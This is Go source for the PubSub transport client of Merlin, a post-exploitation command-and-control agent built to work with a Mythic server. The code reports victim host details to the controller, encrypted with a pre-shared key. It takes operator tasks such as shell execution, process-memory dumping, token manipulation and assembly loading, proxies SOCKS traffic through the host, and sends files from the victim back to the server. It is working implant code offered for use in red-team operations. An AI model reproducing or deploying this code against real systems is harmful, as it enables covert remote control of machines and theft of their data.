/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/Ne0nd0g/merlin-agent/v2/core"
	merlinOS "github.com/Ne0nd0g/merlin-agent/v2/os"
	messages "github.com/Ne0nd0g/merlin-message"
	"github.com/Ne0nd0g/merlin-message/jobs"
	"github.com/fatih/color"
	"github.com/google/uuid"
)

var socksConnection = sync.Map{}
var mythicSocksConnection = sync.Map{}
var socksCounter = sync.Map{}

type PubSubClient struct {
	transport   *Transport
	agentID     string
	payloadUUID string
	instanceID  string
	config      map[string]interface{}
	messages    chan interface{}
	pendingJobs []messages.Base
	mu          sync.Mutex
	running     bool

	// Encryption settings
	encryptionMode  string // "aes256_hmac" or "none"
	psk             []byte // 32-byte AES key (nil for plaintext mode)
	initialChan     chan map[string]interface{}
	checkinDone     bool
	listenerStarted bool

	// Pending file downloads waiting for Mythic file_id (phase 2 of download handshake)
	pendingDownloads sync.Map // task_id (string) -> pendingDownloadData
}

// pendingDownloadData holds file info between DownloadInit and DownloadSend phases
type pendingDownloadData struct {
	fileBlob string
	fullPath string
}

func NewPubSubClient(cfg *Config, agentID string, pskB64 string, encMode string) (*PubSubClient, error) {
	instanceID := uuid.New().String()

	if core.Verbose {
		color.Cyan(fmt.Sprintf("[Merlin] [pubsub_client.go] Generated instance ID: %s (agent UUID: %s)", instanceID, agentID))
		color.Cyan(fmt.Sprintf("[Merlin] [pubsub_client.go] Subscription will be: mythic-tasks-sub-%s", instanceID))
	}

	var pskKey []byte
	if encMode == "" {
		encMode = "aes256_hmac"
	}

	switch encMode {
	case "aes256_hmac":
		if pskB64 == "" {
			return nil, fmt.Errorf("[Merlin] [pubsub_client.go] PSK required for aes256_hmac mode but not provided")
		}
		var err error
		pskKey, err = base64.StdEncoding.DecodeString(pskB64)
		if err != nil {
			return nil, fmt.Errorf("[Merlin] [pubsub_client.go] failed to decode PSK: %w", err)
		}
		if len(pskKey) != 32 {
			return nil, fmt.Errorf("[Merlin] [pubsub_client.go] PSK must be 32 bytes, got %d", len(pskKey))
		}
		if core.Verbose {
			color.Green("[Merlin] [pubsub_client.go] AES-256 PSK loaded successfully")
		}
	case "none":
		if core.Verbose {
			color.Yellow("[Merlin] [pubsub_client.go] Plaintext mode")
		}
	default:
		return nil, fmt.Errorf("[Merlin] [pubsub_client.go] unknown encryption mode: %s", encMode)
	}

	transport, err := NewTransport(cfg, instanceID, agentID)
	if err != nil {
		return nil, fmt.Errorf("[Merlin] [pubsub_client.go] failed to create pubsub transport: %w", err)
	}

	client := &PubSubClient{
		transport:      transport,
		agentID:        agentID,
		payloadUUID:    agentID,
		instanceID:     instanceID,
		config:         make(map[string]interface{}),
		messages:       make(chan interface{}, 100),
		pendingJobs:    make([]messages.Base, 0),
		running:        false,
		encryptionMode: encMode,
		psk:            pskKey,
	}

	return client, nil
}

func (p *PubSubClient) Authenticate(msg messages.Base) error {
	if core.Verbose {
		color.Green("[Merlin] [pubsub_client.go] PubSub client authenticated")
	}
	return nil
}

func (p *PubSubClient) Get(key string) string {
	p.mu.Lock()
	defer p.mu.Unlock()
	if val, ok := p.config[key]; ok {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

func (p *PubSubClient) Set(key string, value string) error {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.config[key] = value
	return nil
}

func (p *PubSubClient) Initial() error {
	time.Sleep(2 * time.Second)

	p.initialChan = make(chan map[string]interface{}, 10)

	if !p.listenerStarted {
		p.listenerStarted = true
		go func() {
			err := p.transport.Listen(func(task map[string]interface{}) map[string]interface{} {
				if core.Debug {
					color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Received message: %v", task))
				}
				if !p.checkinDone {
					p.initialChan <- task
				} else {
					p.messages <- task
				}
				return nil
			})
			if err != nil {
				if core.Verbose {
					color.Red(fmt.Sprintf("[Merlin] [pubsub_client.go] Transport listener error: %v", err))
				}
			}
		}()
	}

	if core.Verbose {
		color.Cyan("[Merlin] [pubsub_client.go] Sending encrypted checkin...")
	}

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	ips := []string{}
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	if len(ips) == 0 {
		ips = []string{"127.0.0.1"}
	}

	integrityLevel, _ := merlinOS.GetIntegrityLevel()

	checkinMsg := map[string]interface{}{
		"action":          "checkin",
		"uuid":            p.agentID,
		"ips":             ips,
		"os":              runtime.GOOS,
		"user":            username,
		"host":            hostname,
		"pid":             os.Getpid(),
		"architecture":    runtime.GOARCH,
		"integrity_level": integrityLevel,
	}
	checkinJSON, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("[Merlin] [pubsub_client.go] failed to marshal checkin: %w", err)
	}

	frame, err := p.encryptFrame(checkinJSON)
	if err != nil {
		return fmt.Errorf("[Merlin] [pubsub_client.go] failed to encrypt checkin: %w", err)
	}

	if err := p.transport.SendRaw(frame); err != nil {
		return fmt.Errorf("[Merlin] [pubsub_client.go] failed to send checkin: %w", err)
	}

	var resp map[string]interface{}
	select {
	case resp = <-p.initialChan:
	case <-time.After(30 * time.Second):
		return fmt.Errorf("[Merlin] [pubsub_client.go] timeout waiting for checkin response")
	}

	encodedMsg, ok := resp["message"].(string)
	if !ok {
		return fmt.Errorf("[Merlin] [pubsub_client.go] checkin response missing 'message' field")
	}

	_, body, err := parseMythicFrame(encodedMsg)
	if err != nil {
		return fmt.Errorf("[Merlin] [pubsub_client.go] failed to parse checkin response frame: %w", err)
	}

	var plaintext []byte
	if p.encryptionMode == "none" {
		plaintext = body
		if core.Debug {
			color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Plaintext checkin response: %s", string(plaintext)))
		}
	} else {
		plaintext, err = aesDecrypt(p.psk, body)
		if err != nil {
			return fmt.Errorf("[Merlin] [pubsub_client.go] failed to AES-decrypt checkin response: %w", err)
		}
		if core.Debug {
			color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Decrypted checkin response: %s", string(plaintext)))
		}
	}

	var checkinResp map[string]interface{}
	if err := json.Unmarshal(plaintext, &checkinResp); err != nil {
		return fmt.Errorf("[Merlin] [pubsub_client.go] failed to parse checkin response JSON: %w", err)
	}

	newID, ok := checkinResp["id"].(string)
	if !ok || newID == "" {
		return fmt.Errorf("[Merlin] [pubsub_client.go] checkin response missing 'id' field")
	}

	status, _ := checkinResp["status"].(string)
	if status != "success" {
		return fmt.Errorf("[Merlin] [pubsub_client.go] checkin response status: %s", status)
	}

	oldID := p.agentID
	p.agentID = newID
	p.transport.agentID = newID

	p.checkinDone = true
	if core.Verbose {
		color.Green(fmt.Sprintf("[Merlin] [pubsub_client.go] Checkin successful, UUID updated from %s to %s", oldID, newID))
	}

	return nil
}

// convertMythicTasksToMerlin converts Mythic task format to Merlin messages.Base
func (p *PubSubClient) convertMythicTasksToMerlin(taskData map[string]interface{}) messages.Base {
	base := messages.Base{
		ID:   uuid.MustParse(p.payloadUUID),
		Type: messages.JOBS,
	}

	tasksInterface, ok := taskData["tasks"]
	if !ok {
		base.Payload = []jobs.Job{}
		return base
	}

	tasksArray, ok := tasksInterface.([]interface{})
	if !ok {
		base.Payload = []jobs.Job{}
		return base
	}

	merlinJobs := make([]jobs.Job, 0, len(tasksArray))
	for _, taskInterface := range tasksArray {
		taskMap, ok := taskInterface.(map[string]interface{})
		if !ok {
			continue
		}

		taskID, _ := taskMap["id"].(string)
		commandStr, _ := taskMap["command"].(string)

		var cmd jobs.Command
		var jobType jobs.Type
		var payload interface{}
		var parsedFromWrapper bool

		if paramsInterface, ok := taskMap["parameters"]; ok {
			if paramsStr, ok := paramsInterface.(string); ok {
				var wrapper struct {
					Type    int    `json:"type"`
					Payload string `json:"payload"`
				}
				if err := json.Unmarshal([]byte(paramsStr), &wrapper); err == nil && wrapper.Payload != "" {
					parsedFromWrapper = true
					jobType = jobs.Type(wrapper.Type)
					switch jobType {
					case jobs.SOCKS:
						var s jobs.Socks
						json.Unmarshal([]byte(wrapper.Payload), &s)
						payload = s
					case jobs.FILETRANSFER:
						var ft jobs.FileTransfer
						json.Unmarshal([]byte(wrapper.Payload), &ft)
						payload = ft
					default:
						json.Unmarshal([]byte(wrapper.Payload), &cmd)
						if cmd.Command == "" {
							cmd.Command = commandStr
						}
						payload = cmd
					}
				}

				// Fall back: parse as raw parameters map
				if !parsedFromWrapper {
					var paramsMap map[string]interface{}
					if err := json.Unmarshal([]byte(paramsStr), &paramsMap); err == nil {
						if payloadInterface, ok := paramsMap["payload"]; ok {
							if payloadStr, ok := payloadInterface.(string); ok {
								json.Unmarshal([]byte(payloadStr), &cmd)
							} else if payloadMap, ok := payloadInterface.(map[string]interface{}); ok {
								if c, ok := payloadMap["command"].(string); ok {
									cmd.Command = c
								}
								if a, ok := payloadMap["args"].([]interface{}); ok {
									for _, arg := range a {
										if argStr, ok := arg.(string); ok {
											cmd.Args = append(cmd.Args, argStr)
										}
									}
								}
							}
						}
					}
				}
			}
		}

		if !parsedFromWrapper {
			if cmd.Command == "" {
				cmd.Command = commandStr
			}

			switch strings.ToLower(cmd.Command) {
			case "exit", "agentinfo", "ja3", "killdate", "maxretry", "padding", "parrot", "skew", "sleep", "initialize", "connect", "listener":
				jobType = jobs.CONTROL
			case "shell", "run", "exec":
				jobType = jobs.CMD
			case "ps", "pipes", "uptime", "netstat", "ssh", "token", "runas", "memory", "memfd", "link", "unlink", "create-process", "minidump", "invoke-assembly", "load-assembly", "list-assembly":
				jobType = jobs.MODULE
			case "ls", "cd", "pwd", "rm", "env", "ifconfig", "killprocess", "nslookup", "touch", "sdelete":
				jobType = jobs.NATIVE
			case "socks":
				jobType = jobs.SOCKS
			case "download", "upload":
				jobType = jobs.FILETRANSFER
			default:
				jobType = jobs.NATIVE
			}

			// Set the correct payload type based on job type
			switch jobType {
			case jobs.SOCKS:
				payload = jobs.Socks{}
			case jobs.FILETRANSFER:
				payload = jobs.FileTransfer{}
			default:
				payload = cmd
			}
		}

		job := jobs.Job{
			AgentID: uuid.MustParse(p.payloadUUID),
			ID:      taskID,
			Token:   uuid.New(),
			Type:    jobType,
			Payload: payload,
		}

		merlinJobs = append(merlinJobs, job)

		// create a RESULT job to acknowledge the task to Mythic
		if taskID != "" && (jobType == jobs.SOCKS || jobType == jobs.CONTROL) {
			ackJob := jobs.Job{
				AgentID: uuid.MustParse(p.payloadUUID),
				ID:      taskID,
				Token:   uuid.New(),
				Type:    jobs.RESULT,
				Payload: jobs.Results{Stdout: fmt.Sprintf("Task received: %s", commandStr)},
			}
			merlinJobs = append(merlinJobs, ackJob)
		}

		if core.Debug {
			color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Created job: ID=%s, Command=%s, Args=%v", job.ID, cmd.Command, cmd.Args))
		}
	}

	if core.Debug {
		color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Total jobs created: %d", len(merlinJobs)))
	}

	base.Payload = merlinJobs
	return base
}

type mythicSocks struct {
	ServerId int32  `json:"server_id"`
	Data     string `json:"data"`
	Exit     bool   `json:"exit"`
}

func (p *PubSubClient) convertSocksToJobs(socks []mythicSocks) (messages.Base, error) {
	base := messages.Base{
		Type: messages.JOBS,
		ID:   uuid.MustParse(p.payloadUUID),
	}

	var returnJobs []jobs.Job

	for _, sock := range socks {
		job := jobs.Job{
			AgentID: uuid.MustParse(p.payloadUUID),
			Type:    jobs.SOCKS,
		}
		payload := jobs.Socks{
			Close: sock.Exit,
		}

		id, ok := socksConnection.Load(sock.ServerId)
		if !ok {
			id = uuid.New()
			socksConnection.Store(sock.ServerId, id)
			mythicSocksConnection.Store(id, sock.ServerId)
			socksCounter.Store(id, 0)

			// Spoof initial SOCKS5 handshake (version 5, 1 method, no auth)
			payload.ID = id.(uuid.UUID)
			payload.Data = []byte{0x05, 0x01, 0x00}
			payload.Index = 0
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		}
		payload.ID = id.(uuid.UUID)

		var err error
		payload.Data, err = base64.StdEncoding.DecodeString(sock.Data)
		if err != nil {
			return base, fmt.Errorf("[Merlin] [pubsub_client.go] failed to base64 decode SOCKS data: %w", err)
		}

		i, ok := socksCounter.Load(id)
		if !ok {
			return base, fmt.Errorf("[Merlin] [pubsub_client.go] SOCKS counter not found for UUID: %s", id)
		}
		payload.Index = i.(int) + 1
		job.Payload = payload
		socksCounter.Store(id, i.(int)+1)
		returnJobs = append(returnJobs, job)
	}

	base.Payload = returnJobs
	return base, nil
}

func (p *PubSubClient) Listen() ([]messages.Base, error) {
	p.mu.Lock()
	if !p.running {
		p.running = true
		p.mu.Unlock()

		if core.Verbose {
			color.Cyan("[Merlin] [pubsub_client.go] Starting PubSub message processor goroutine")
		}

		go func() {
			for msg := range p.messages {
				mythicMap, ok := msg.(map[string]interface{})
				if !ok {
					if core.Verbose {
						color.Red(fmt.Sprintf("[Merlin] [pubsub_client.go] Invalid message type: %T", msg))
					}
					continue
				}

				encodedMsg, ok := mythicMap["message"].(string)
				if !ok {
					if core.Verbose {
						color.Red("[Merlin] [pubsub_client.go] Message missing 'message' field")
					}
					continue
				}

				_, body, err := parseMythicFrame(encodedMsg)
				if err != nil {
					if core.Verbose {
						color.Red(fmt.Sprintf("[Merlin] [pubsub_client.go] Failed to parse Mythic frame: %v", err))
					}
					continue
				}

				var plaintext []byte
				if p.encryptionMode == "none" {
					plaintext = body
				} else {
					plaintext, err = aesDecrypt(p.psk, body)
					if err != nil {
						if core.Verbose {
							color.Red(fmt.Sprintf("[Merlin] [pubsub_client.go] Failed to AES-decrypt message: %v", err))
						}
						continue
					}
				}

				var taskData map[string]interface{}
				if err := json.Unmarshal(plaintext, &taskData); err != nil {
					if core.Verbose {
						color.Red(fmt.Sprintf("[Merlin] [pubsub_client.go] Failed to parse decrypted JSON: %v", err))
					}
					continue
				}

				if core.Debug {
					color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Decrypted task data: %v", taskData))
				}

				// Convert tasks to Merlin messages.Base
				base := p.convertMythicTasksToMerlin(taskData)

				if core.Verbose {
					color.Green(fmt.Sprintf("[Merlin] [pubsub_client.go] Received and decrypted task from PubSub: %v", base))
				}

				p.mu.Lock()
				p.pendingJobs = append(p.pendingJobs, base)
				p.mu.Unlock()

				// Process SOCKS data from server response
				if socksInterface, ok := taskData["socks"]; ok {
					if socksArray, ok := socksInterface.([]interface{}); ok && len(socksArray) > 0 {
						var mythicSocksData []mythicSocks
						socksJSON, err := json.Marshal(socksArray)
						if err == nil {
							if err := json.Unmarshal(socksJSON, &mythicSocksData); err == nil && len(mythicSocksData) > 0 {
								socksBase, err := p.convertSocksToJobs(mythicSocksData)
								if err != nil {
									if core.Verbose {
										color.Red(fmt.Sprintf("[Merlin] [pubsub_client.go] Failed to convert SOCKS data: %v", err))
									}
								} else if len(socksBase.Payload.([]jobs.Job)) > 0 {
									if core.Debug {
										color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Received %d SOCKS jobs from server", len(socksBase.Payload.([]jobs.Job))))
									}
									p.mu.Lock()
									p.pendingJobs = append(p.pendingJobs, socksBase)
									p.mu.Unlock()
								}
							}
						}
					}
				}

				// Handle DownloadInit ack
				if responsesInterface, ok := taskData["responses"]; ok {
					if responsesArray, ok := responsesInterface.([]interface{}); ok {
						for _, respInterface := range responsesArray {
							respMap, ok := respInterface.(map[string]interface{})
							if !ok {
								continue
							}
							if core.Verbose {
								color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Mythic response entry: %v", respMap))
							}
							fileID, hasFileID := respMap["file_id"].(string)
							taskID, hasTaskID := respMap["task_id"].(string)
							if !hasFileID || fileID == "" || !hasTaskID {
								continue
							}
							pendingInterface, ok := p.pendingDownloads.Load(taskID)
							if !ok {
								continue
							}
							pending := pendingInterface.(pendingDownloadData)
							p.pendingDownloads.Delete(taskID)
							if core.Verbose {
								color.Green(fmt.Sprintf("[Merlin] [pubsub_client.go] Received file_id %s for task %s, sending chunk data", fileID, taskID))
							}
							downloadSendMsg := map[string]interface{}{
								"action": "post_response",
								"responses": []interface{}{
									map[string]interface{}{
										"task_id":     taskID,
										"completed":   true,
										"status":      "success",
										"user_output": fmt.Sprintf("File downloaded from victim: %s\nView it in 'Search Files'", pending.fullPath),
										"download": map[string]interface{}{
											"file_id":    fileID,
											"chunk_num":  1,
											"chunk_data": pending.fileBlob,
										},
									},
								},
							}
							if err := p.sendMythicMsg(downloadSendMsg); err != nil {
								if core.Verbose {
									color.Red(fmt.Sprintf("[Merlin] [pubsub_client.go] Failed to send DownloadSend for task %s: %v", taskID, err))
								}
							}
						}
					}
				}
			}
		}()

		return []messages.Base{}, nil
	}

	pendingJobs := make([]messages.Base, len(p.pendingJobs))
	copy(pendingJobs, p.pendingJobs)
	p.pendingJobs = p.pendingJobs[:0]
	p.mu.Unlock()

	if core.Debug && len(pendingJobs) > 0 {
		color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Returning %d jobs from pending queue", len(pendingJobs)))
	}

	if len(pendingJobs) == 0 {
		time.Sleep(5 * time.Millisecond)
	}

	return pendingJobs, nil
}

func (p *PubSubClient) encryptFrame(body []byte) (string, error) {
	if p.encryptionMode == "none" {
		return buildMythicFrame(p.agentID, body), nil
	}
	encrypted, err := aesEncrypt(p.psk, body)
	if err != nil {
		return "", err
	}
	return buildMythicFrame(p.agentID, encrypted), nil
}

func (p *PubSubClient) sendMythicMsg(mythicMsg map[string]interface{}) error {
	jsonBody, err := json.Marshal(mythicMsg)
	if err != nil {
		return fmt.Errorf("[Merlin] [pubsub_client.go] failed to marshal: %w", err)
	}
	frame, err := p.encryptFrame(jsonBody)
	if err != nil {
		return fmt.Errorf("[Merlin] [pubsub_client.go] failed to encrypt: %w", err)
	}
	return p.transport.SendRaw(frame)
}

func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
	if core.Debug {
		color.Yellow(fmt.Sprintf("[Merlin] [pubsub_client.go] Sending message: %v", message))
	}

	mythicMsg := p.convertToMythicFormat(message)

	jsonBody, err := json.Marshal(mythicMsg)
	if err != nil {
		return nil, fmt.Errorf("[Merlin] [pubsub_client.go] failed to marshal message: %w", err)
	}

	frame, err := p.encryptFrame(jsonBody)
	if err != nil {
		return nil, fmt.Errorf("[Merlin] [pubsub_client.go] failed to encrypt message: %w", err)
	}

	if err := p.transport.SendRaw(frame); err != nil {
		return nil, fmt.Errorf("[Merlin] [pubsub_client.go] failed to send: %w", err)
	}

	if p.encryptionMode == "none" {
		if core.Verbose {
			color.Yellow("[Merlin] [pubsub_client.go] Plaintext message sent")
		}
	} else {
		if core.Verbose {
			color.Green("[Merlin] [pubsub_client.go] Encrypted message sent successfully")
		}
	}

	return []messages.Base{}, nil
}

func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]interface{} {
	mythicMsg := make(map[string]interface{})

	switch msg.Type {
	case messages.CHECKIN:
		mythicMsg["action"] = "get_tasking"
		mythicMsg["tasking_size"] = -1

	case messages.JOBS:
		jobsArray, ok := msg.Payload.([]jobs.Job)
		if !ok || len(jobsArray) == 0 {
			mythicMsg["action"] = "get_tasking"
			mythicMsg["tasking_size"] = -1
			break
		}

		responses := make([]interface{}, 0)
		socksData := make([]mythicSocks, 0)

		for _, job := range jobsArray {
			switch job.Type {
			case jobs.SOCKS:
				sockMsg := job.Payload.(jobs.Socks)

				// Drop the spoofed SOCKS handshake response
				if bytes.Equal(sockMsg.Data, []byte{0x05, 0x00}) {
					break
				}

				sock := mythicSocks{
					Exit: sockMsg.Close,
				}

				id, ok := mythicSocksConnection.Load(sockMsg.ID)
				if !ok {
					if core.Verbose {
						color.Red(fmt.Sprintf("[Merlin] [pubsub_client.go] SOCKS connection ID %s not found in mapping", sockMsg.ID))
					}
					break
				}
				sock.ServerId = id.(int32)

				sock.Data = base64.StdEncoding.EncodeToString(sockMsg.Data)
				socksData = append(socksData, sock)

				if sockMsg.Close {
					socksConnection.Delete(id)
					mythicSocksConnection.Delete(sockMsg.ID)
				}

			case jobs.RESULT:
				result := job.Payload.(jobs.Results)
				response := map[string]interface{}{
					"task_id":   job.ID,
					"completed": true,
					"status":    "success",
				}
				if result.Stdout != "" {
					response["user_output"] = result.Stdout
				}
				if result.Stderr != "" {
					response["user_output"] = result.Stderr
				}
				responses = append(responses, response)

			case jobs.AGENTINFO:
				infoBytes, _ := json.Marshal(job.Payload)
				response := map[string]interface{}{
					"task_id":     job.ID,
					"user_output": string(infoBytes),
					"completed":   true,
					"status":      "success",
				}
				responses = append(responses, response)

			case jobs.FILETRANSFER:
				ft := job.Payload.(jobs.FileTransfer)
				if ft.IsDownload {
					p.pendingDownloads.Store(job.ID, pendingDownloadData{
						fileBlob: ft.FileBlob,
						fullPath: ft.FileLocation,
					})
					response := map[string]interface{}{
						"task_id": job.ID,
						"download": map[string]interface{}{
							"total_chunks": 1,
							"full_path":    ft.FileLocation,
						},
					}
					responses = append(responses, response)
				} else {
					response := map[string]interface{}{
						"task_id":     job.ID,
						"user_output": fmt.Sprintf("File downloaded: %s", ft.FileLocation),
						"completed":   true,
						"status":      "success",
					}
					responses = append(responses, response)
				}
			}
		}

		if len(responses) > 0 || len(socksData) > 0 {
			mythicMsg["action"] = "post_response"
			mythicMsg["responses"] = responses
			if len(socksData) > 0 {
				mythicMsg["socks"] = socksData
			}
		} else {
			mythicMsg["action"] = "get_tasking"
			mythicMsg["tasking_size"] = -1
		}

	default:
		mythicMsg["action"] = "post_response"
		mythicMsg["responses"] = []interface{}{msg}
	}

	return mythicMsg
}

func (p *PubSubClient) Synchronous() bool {
	return true
}

func (p *PubSubClient) Close() error {
	if core.Verbose {
		color.Cyan("[Merlin] [pubsub_client.go] Closing PubSub client")
	}

	p.mu.Lock()
	p.running = false
	p.mu.Unlock()

	close(p.messages)
	return p.transport.Close()
}
